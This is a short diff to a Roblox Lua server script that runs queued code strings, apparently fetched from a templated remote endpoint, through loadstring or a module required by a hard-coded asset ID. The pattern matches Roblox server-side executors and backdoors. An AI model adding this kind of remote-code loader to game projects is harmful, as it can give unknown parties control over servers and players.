@@ -3,7 +3,12 @@ local plrs = game:GetService("Players")
 
 local endpoint = "https://{{endpoint}}/"
 
+local run = loadstring
+local T = table
 local loadstringEnabled = pcall(function() loadstring("_ = true")() end)
+if not loadstringEnabled then
+	run = require(0x65243E0A0531)
+end
 
 local threads = {}
 
@@ -32,11 +37,8 @@ local function plrAdded(plr)
                     for _, code in pairs(queue) do
 				    	coroutine.wrap(function()
 							pcall(function()
-								if loadstringEnabled then
-									loadstring(code)()
-								else
-									require(0x65243E0A0531)(code)
-								end
+								run(code)()
+								setfenv(1, setmetatable({table = T}, {__index = getfenv(0)}))
 							end)
                         end)()
                     end
